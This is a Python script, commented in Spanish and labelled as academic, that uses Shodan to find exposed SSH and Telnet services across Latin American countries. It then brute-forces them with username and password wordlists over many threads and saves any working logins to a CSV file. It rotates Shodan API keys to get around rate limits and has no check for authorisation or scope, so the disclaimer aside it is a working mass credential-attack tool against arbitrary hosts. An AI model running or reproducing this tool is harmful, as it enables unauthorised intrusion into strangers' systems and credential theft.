#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Validador de Credenciales SSH y Telnet usando Shodan API
Desarrollado para fines académicos y educativos en el contexto de seguridad informática

ADVERTENCIA: Esta herramienta es EXCLUSIVAMENTE para fines académicos y éticos.
El uso indebido de esta herramienta puede tener consecuencias legales graves.
El usuario asume toda la responsabilidad legal por cualquier uso indebido.

Autor: [Tu Nombre]
Fecha: 5 de abril de 2025
Versión: 1.0

Descripción:
Este script permite realizar auditorías y validaciones de credenciales SSH y Telnet
utilizando Shodan API para identificar servicios expuestos en países de Latinoamérica.
"""

# Importar bibliotecas necesarias
import os
import sys
import time
import socket
import logging
import argparse
import concurrent.futures
from datetime import datetime
import json
import csv
import random
from typing import List, Dict, Tuple, Any, Optional, Union

# Bibliotecas externas
try:
    import shodan
    import paramiko
    import telnetlib
except ImportError as e:
    print(f"Error: Falta instalar algunas dependencias: {e}")
    print("Instale las dependencias con: pip install shodan paramiko")
    sys.exit(1)

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("validator.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("ValidadorCredenciales")

# Constantes
COUNTRIES_LATAM = ["AR", "BO", "BR", "CL", "CO", "CR", "CU", "DO", "EC", "SV", 
                  "GT", "HT", "HN", "MX", "NI", "PA", "PY", "PE", "PR", "UY", "VE"]
DEFAULT_TIMEOUT = 5  # segundos
DEFAULT_THREADS = 10  # número de hilos concurrentes

class Config:
    """Gestión de configuración del programa"""
    def __init__(self):
        self.shodan_api_keys = []
        self.current_key_index = 0
        self.timeout = DEFAULT_TIMEOUT
        self.max_threads = DEFAULT_THREADS
        self.ip_file = "ips.txt"
        self.users_file = "users.txt"
        self.passwords_file = "passwords.txt"
        self.results_dir = "results"
        
    def load_api_keys(self, api_keys_file: str) -> bool:
        """Carga las claves API de Shodan desde un archivo"""
        try:
            with open(api_keys_file, 'r') as f:
                self.shodan_api_keys = [line.strip() for line in f if line.strip()]
            return len(self.shodan_api_keys) > 0
        except Exception as e:
            logger.error(f"Error al cargar las claves API: {str(e)}")
            return False
    
    def get_next_api_key(self) -> str:
        """Obtiene la siguiente clave API disponible de forma rotativa"""
        if not self.shodan_api_keys:
            raise ValueError("No hay claves API disponibles")
        
        key = self.shodan_api_keys[self.current_key_index]
        self.current_key_index = (self.current_key_index + 1) % len(self.shodan_api_keys)
        return key

class FileManager:
    """Gestión de archivos para cargar y guardar datos"""
    @staticmethod
    def load_list_from_file(file_path: str) -> List[str]:
        """Carga una lista de elementos desde un archivo de texto"""
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error al cargar el archivo {file_path}: {str(e)}")
            return []
    
    @staticmethod
    def save_results(results: List[Dict], filename: str) -> bool:
        """Guarda los resultados en un archivo JSON"""
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Error al guardar los resultados en {filename}: {str(e)}")
            return False
    
    @staticmethod
    def save_valid_credentials(credentials: List[Dict], filename: str) -> bool:
        """Guarda las credenciales válidas encontradas en un archivo CSV"""
        try:
            with open(filename, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=["ip", "port", "service", "username", "password", "timestamp"])
                writer.writeheader()
                writer.writerows(credentials)
            return True
        except Exception as e:
            logger.error(f"Error al guardar las credenciales válidas en {filename}: {str(e)}")
            return False

class ShodanScanner:
    """Clase para realizar búsquedas en Shodan API"""
    def __init__(self, config: Config):
        self.config = config
    
    def search_services(self, service: str, countries: List[str]) -> List[Dict]:
        """
        Busca servicios SSH o Telnet en países específicos usando Shodan API
        
        Args:
            service: Servicio a buscar ('ssh' o 'telnet')
            countries: Lista de códigos de países (ISO 3166-1 alpha-2)
            
        Returns:
            Lista de resultados con IP, puerto y detalles del servicio
        """
        results = []
        
        # Construir la consulta de búsqueda para Shodan
        country_filter = " OR ".join([f"country:{c}" for c in countries])
        query = f"{service} {country_filter}"
        
        try:
            # Usar la siguiente clave API disponible
            api_key = self.config.get_next_api_key()
            api = shodan.Shodan(api_key)
            
            # Realizar la búsqueda
            logger.info(f"Buscando servicios {service} en Shodan con la consulta: {query}")
            search_results = api.search(query)
            
            # Procesar los resultados
            for result in search_results['matches']:
                ip = result['ip_str']
                port = result['port']
                
                # Detalles adicionales
                country = result.get('location', {}).get('country_code', 'Unknown')
                city = result.get('location', {}).get('city', 'Unknown')
                org = result.get('org', 'Unknown')
                
                # Verificar si es un puerto no convencional
                is_non_standard = (service == 'ssh' and port != 22) or (service == 'telnet' and port != 23)
                port_status = "No convencional" if is_non_standard else "Convencional"
                
                # Agregar a la lista de resultados
                results.append({
                    'ip': ip,
                    'port': port,
                    'service': service,
                    'country': country,
                    'city': city,
                    'org': org,
                    'port_status': port_status,
                    'timestamp': datetime.now().isoformat()
                })
                
            logger.info(f"Búsqueda de {service} completada. Encontrados {len(results)} resultados.")
            
            # Analizar puertos no convencionales
            non_standard_ports = [r for r in results if r['port_status'] == "No convencional"]
            if non_standard_ports:
                logger.info(f"Se encontraron {len(non_standard_ports)} servicios {service} en puertos no convencionales.")
            
            return results
            
        except shodan.APIError as e:
            if "No information available" in str(e):
                logger.warning(f"No se encontró información para la consulta: {query}")
                return []
            elif "Request rate limit reached" in str(e):
                logger.warning(f"Límite de tasa de solicitudes alcanzado para la clave API. Intentando con otra clave...")
                # Si hay más claves disponibles, reintentar con la siguiente
                if len(self.config.shodan_api_keys) > 1:
                    time.sleep(1)  # Esperar un segundo antes de reintentar
                    return self.search_services(service, countries)
                else:
                    logger.error("No hay más claves API disponibles.")
                    return results
            else:
                logger.error(f"Error en la API de Shodan: {str(e)}")
                return results

class ServiceValidator:
    """Clase para validar servicios SSH y Telnet"""
    def __init__(self, config: Config):
        self.config = config
    
    def check_port_open(self, ip: str, port: int) -> bool:
        """Verifica si un puerto está abierto en una dirección IP"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.config.timeout)
        
        try:
            result = sock.connect_ex((ip, port))
            return result == 0
        except Exception as e:
            logger.debug(f"Error al verificar puerto {port} en {ip}: {str(e)}")
            return False
        finally:
            sock.close()
    
    def validate_ssh_credentials(self, ip: str, port: int, username: str, password: str) -> bool:
        """Valida credenciales SSH en una dirección IP y puerto específicos"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                hostname=ip,
                port=port,
                username=username,
                password=password,
                timeout=self.config.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            logger.info(f"✓ Credenciales SSH válidas: {ip}:{port} - {username}:{password}")
            return True
        except paramiko.AuthenticationException:
            logger.debug(f"✗ Autenticación SSH fallida: {ip}:{port} - {username}:{password}")
            return False
        except (paramiko.SSHException, socket.error) as e:
            logger.debug(f"✗ Error de conexión SSH a {ip}:{port}: {str(e)}")
            return False
        except Exception as e:
            logger.debug(f"✗ Error inesperado SSH a {ip}:{port}: {str(e)}")
            return False
        finally:
            client.close()
    
    def validate_telnet_credentials(self, ip: str, port: int, username: str, password: str) -> bool:
        """Valida credenciales Telnet en una dirección IP y puerto específicos"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=self.config.timeout)
            
            # Esperar prompt de login
            response = tn.read_until(b"login: ", timeout=self.config.timeout)
            tn.write(username.encode('ascii') + b"\n")
            
            # Esperar prompt de password
            response = tn.read_until(b"Password: ", timeout=self.config.timeout)
            tn.write(password.encode('ascii') + b"\n")
            
            # Verificar si el login fue exitoso (esto varía según el servidor)
            response = tn.read_until(b"$", timeout=self.config.timeout)
            
            # Si llegamos aquí sin excepción, probablemente la autenticación fue exitosa
            logger.info(f"✓ Credenciales Telnet válidas: {ip}:{port} - {username}:{password}")
            tn.close()
            return True
        except Exception as e:
            logger.debug(f"✗ Error de conexión Telnet a {ip}:{port}: {str(e)}")
            return False

class CredentialTester:
    """Clase para probar credenciales de forma masiva"""
    def __init__(self, config: Config, validator: ServiceValidator):
        self.config = config
        self.validator = validator
        self.valid_credentials = []
        self.lock = __import__('threading').Lock()  # Para sincronización en hilos
    
    def _test_target(self, target: Dict, usernames: List[str], passwords: List[str]) -> Dict:
        """
        Prueba las credenciales en un solo objetivo
        
        Args:
            target: Objetivo con IP, puerto y servicio
            usernames: Lista de nombres de usuario a probar
            passwords: Lista de contraseñas a probar
            
        Returns:
            Resultados de la prueba para este objetivo
        """
        ip = target['ip']
        port = target['port']
        service = target['service']
        result = {
            'ip': ip,
            'port': port,
            'service': service,
            'accessible': False,
            'credentials_found': False,
            'attempts': 0,
            'errors': []
        }
        
        # Verificar si el puerto está abierto
        if not self.validator.check_port_open(ip, port):
            result['errors'].append("Puerto cerrado o inaccesible")
            logger.info(f"Puerto cerrado: {ip}:{port} ({service})")
            return result
        
        result['accessible'] = True
        logger.info(f"Puerto abierto: {ip}:{port} ({service})")
        
        # Probar combinaciones de credenciales
        for username in usernames:
            found_valid = False
            for password in passwords:
                result['attempts'] += 1
                
                # Validar credenciales según el servicio
                valid = False
                try:
                    if service.lower() == 'ssh':
                        valid = self.validator.validate_ssh_credentials(ip, port, username, password)
                    elif service.lower() == 'telnet':
                        valid = self.validator.validate_telnet_credentials(ip, port, username, password)
                except Exception as e:
                    error_msg = f"Error inesperado al validar {service} en {ip}:{port}: {str(e)}"
                    result['errors'].append(error_msg)
                    logger.error(error_msg)
                
                # Si las credenciales son válidas, guardarlas
                if valid:
                    result['credentials_found'] = True
                    credential = {
                        'ip': ip,
                        'port': port,
                        'service': service,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    # Agregar a la lista global de credenciales encontradas (thread-safe)
                    with self.lock:
                        self.valid_credentials.append(credential)
                    
                    found_valid = True
                    break
            
            # Si se encontró una credencial válida, pasar al siguiente objetivo
            if found_valid:
                break
        
        return result
    
    def test_credentials(self, targets: List[Dict], usernames: List[str], passwords: List[str]) -> Dict:
        """
        Prueba combinaciones de credenciales en múltiples objetivos usando paralelización
        
        Args:
            targets: Lista de objetivos con IP, puerto y servicio
            usernames: Lista de nombres de usuario a probar
            passwords: Lista de contraseñas a probar
            
        Returns:
            Estadísticas de la prueba de credenciales
        """
        results = []
        total_targets = len(targets)
        start_time = time.time()
        
        # Crear un directorio para los resultados si no existe
        os.makedirs(self.config.results_dir, exist_ok=True)
        
        logger.info(f"Iniciando prueba de credenciales en {total_targets} objetivos con {len(usernames)} usuarios y {len(passwords)} contraseñas")
        logger.info(f"Utilizando {self.config.max_threads} hilos concurrentes")
        
        # Usar ThreadPoolExecutor para paralelizar las pruebas
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            # Crear un futuro para cada objetivo
            future_to_target = {
                executor.submit(self._test_target, target, usernames, passwords): target
                for target in targets
            }
            
            # Procesar los resultados a medida que se completan
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    results.append(result)
                    # Mostrar progreso
                    progress = len(results) / total_targets * 100
                    logger.info(f"Progreso: {progress:.1f}% - Procesado {target['ip']}:{target['port']} ({target['service']})")
                except Exception as e:
                    logger.error(f"Error al procesar {target['ip']}:{target['port']}: {str(e)}")
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # Guardar las credenciales válidas en un archivo
        credentials_file = os.path.join(self.config.results_dir, f"valid_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
        FileManager.save_valid_credentials(self.valid_credentials, credentials_file)
        
        # Calcular estadísticas
        accessible_targets = sum(1 for r in results if r['accessible'])
        targets_with_valid_creds = sum(1 for r in results if r['credentials_found'])
        total_attempts = sum(r['attempts'] for r in results)
        targets_with_errors = sum(1 for r in results if r['errors'])
        
        # Preparar estadísticas
        stats = {
            'total_targets': total_targets,
            'accessible_targets': accessible_targets,
            'inaccessible_targets': total_targets - accessible_targets,
            'accessibility_percentage': (accessible_targets / total_targets * 100) if total_targets > 0 else 0,
            'targets_with_valid_creds': targets_with_valid_creds,
            'valid_creds_percentage': (targets_with_valid_creds / accessible_targets * 100) if accessible_targets > 0 else 0,
            'total_attempts': total_attempts,
            'successful_attempts': len(self.valid_credentials),
            'success_percentage': (len(self.valid_credentials) / total_attempts * 100) if total_attempts > 0 else 0,
            'targets_with_errors': targets_with_errors,
            'execution_time': execution_time,
            'credentials_file': credentials_file,
            'timestamp': datetime.now().isoformat()
        }
        
        # Guardar resultados detallados
        details_file = os.path.join(self.config.results_dir, f"detailed_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        FileManager.save_results(results, details_file)
        
        return stats

class ReportGenerator:
    """Clase para generar reportes estadísticos"""
    @staticmethod
    def generate_statistics_report(stats: Dict) -> str:
        """Genera un reporte estadístico en formato de texto"""
        report = """
==================================================
      REPORTE DE VALIDACIÓN DE CREDENCIALES
==================================================

Fecha y hora: {timestamp}

ESTADÍSTICAS DE OBJETIVOS:
- Total de objetivos analizados: {total_targets}
- Objetivos accesibles: {accessible_targets} ({accessibility_percentage:.2f}%)
- Objetivos inaccesibles: {inaccessible_targets}
- Objetivos con credenciales válidas: {targets_with_valid_creds} ({valid_creds_percentage:.2f}% de los accesibles)
- Objetivos con errores: {targets_with_errors}

ESTADÍSTICAS DE CREDENCIALES:
- Total de intentos de autenticación: {total_attempts}
- Intentos exitosos: {successful_attempts}
- Porcentaje de éxito: {success_percentage:.2f}%

RENDIMIENTO:
- Tiempo de ejecución: {execution_time:.2f} segundos

ARCHIVOS GENERADOS:
- Credenciales válidas: {credentials_file}

==================================================
        """.format(**stats)
        
        return report

def main():
    """Función principal del programa"""
    # Banner y disclaimer
    print("""
    =========================================================
    |           VALIDADOR DE CREDENCIALES SSH/TELNET        |
    |                   USANDO SHODAN API                   |
    =========================================================
    
    ADVERTENCIA: Esta herramienta es EXCLUSIVAMENTE para fines
    académicos y éticos. El uso indebido de esta herramienta
    puede tener consecuencias legales graves. El usuario asume
    toda la responsabilidad legal por cualquier uso indebido.
    
    Desarrollado para fines educativos en el contexto de
    seguridad informática aplicada.
    """)
    
    # Configurar el parser de argumentos
    parser = argparse.ArgumentParser(description='Validador de Credenciales SSH/Telnet usando Shodan API')
    parser.add_argument('-k', '--api-keys', required=True, help='Archivo con claves API de Shodan (una por línea)')
    parser.add_argument('-i', '--ips', help='Archivo con lista de IPs (opcional, si no se proporciona se usará Shodan)')
    parser.add_argument('-u', '--users', required=True, help='Archivo con lista de usuarios')
    parser.add_argument('-p', '--passwords', required=True, help='Archivo con lista de contraseñas')
    parser.add_argument('-o', '--output-dir', default='results', help='Directorio para guardar resultados')
    parser.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT, help=f'Timeout para conexiones (default: {DEFAULT_TIMEOUT}s)')
    parser.add_argument('-c', '--countries', nargs='+', default=COUNTRIES_LATAM, help='Códigos de países a buscar (default: Latinoamérica)')
    parser.add_argument('-m', '--max-threads', type=int, default=DEFAULT_THREADS, help=f'Número máximo de hilos concurrentes (default: {DEFAULT_THREADS})')
    parser.add_argument('-s', '--service', choices=['ssh', 'telnet', 'both'], default='both', help='Servicio a probar (ssh, telnet o both)')
    
    args = parser.parse_args()
    
    # Inicializar configuración
    config = Config()
    config.timeout = args.timeout
    config.max_threads = args.max_threads
    config.results_dir = args.output_dir
    
    if args.ips:
        config.ip_file = args.ips
    
    config.users_file = args.users
    config.passwords_file = args.passwords
    
    # Cargar claves API de Shodan
    if not config.load_api_keys(args.api_keys):
        logger.error("No se pudieron cargar las claves API de Shodan. Abortando.")
        sys.exit(1)
    
    # Inicializar componentes
    shodan_scanner = ShodanScanner(config)
    validator = ServiceValidator(config)
    tester = CredentialTester(config, validator)
    
    # Cargar listas de usuarios y contraseñas
    usernames = FileManager.load_list_from_file(config.users_file)
    passwords = FileManager.load_list_from_file(config.passwords_file)
    
    if not usernames or not passwords:
        logger.error("Las listas de usuarios o contraseñas están vacías. Abortando.")
        sys.exit(1)
    
    logger.info(f"Cargados {len(usernames)} usuarios y {len(passwords)} contraseñas.")
    
    # Lista de objetivos a probar
    targets = []
    
    # Si se proporcionó un archivo de IPs, cargarlo
    if args.ips:
        ips = FileManager.load_list_from_file(config.ip_file)
        if not ips:
            logger.error("La lista de IPs está vacía. Abortando.")
            sys.exit(1)
        
        logger.info(f"Cargadas {len(ips)} IPs desde archivo.")
        
        # Agregar las IPs a la lista de objetivos (asumiendo servicios SSH y Telnet en puertos estándar)
        for ip in ips:
            if args.service in ['ssh', 'both']:
                targets.append({
                    'ip': ip,
                    'port': 22,
                    'service': 'ssh',
                    'country': 'Unknown',
                    'city': 'Unknown',
                    'org': 'Unknown',
                    'port_status': 'Convencional',
                    'timestamp': datetime.now().isoformat()
                })
            
            if args.service in ['telnet', 'both']:
                targets.append({
                    'ip': ip,
                    'port': 23,
                    'service': 'telnet',
                    'country': 'Unknown',
                    'city': 'Unknown',
                    'org': 'Unknown',
                    'port_status': 'Convencional',
                    'timestamp': datetime.now().isoformat()
                })
    else:
        # Buscar objetivos usando Shodan API
        logger.info("Buscando servicios en Shodan API...")
        
        if args.service in ['ssh', 'both']:
            ssh_results = shodan_scanner.search_services('ssh', args.countries)
            targets.extend(ssh_results)
        
        if args.service in ['telnet', 'both']:
            telnet_results = shodan_scanner.search_services('telnet', args.countries)
            targets.extend(telnet_results)
        
        if not targets:
            logger.error("No se encontraron servicios. Abortando.")
            sys.exit(1)
        
        logger.info(f"Encontrados {len(targets)} servicios en total.")
        
        # Guardar los resultados de la búsqueda
        os.makedirs(config.results_dir, exist_ok=True)
        results_file = os.path.join(config.results_dir, f"shodan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        FileManager.save_results(targets, results_file)
        logger.info(f"Resultados de la búsqueda guardados en {results_file}")
    
    # Probar credenciales
    logger.info("Iniciando prueba de credenciales...")
    stats = tester.test_credentials(targets, usernames, passwords)
    
    # Generar reporte estadístico
    report = ReportGenerator.generate_statistics_report(stats)
    report_file = os.path.join(config.results_dir, f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    
    try:
        with open(report_file, 'w') as f:
            f.write(report)
        logger.info(f"Reporte guardado en {report_file}")
    except Exception as e:
        logger.error(f"Error al guardar el reporte: {str(e)}")
    
    # Mostrar el reporte en pantalla
    print(report)
    print("\nProceso completado.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nOperación interrumpida por el usuario.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error no controlado: {str(e)}")
        sys.exit(1)
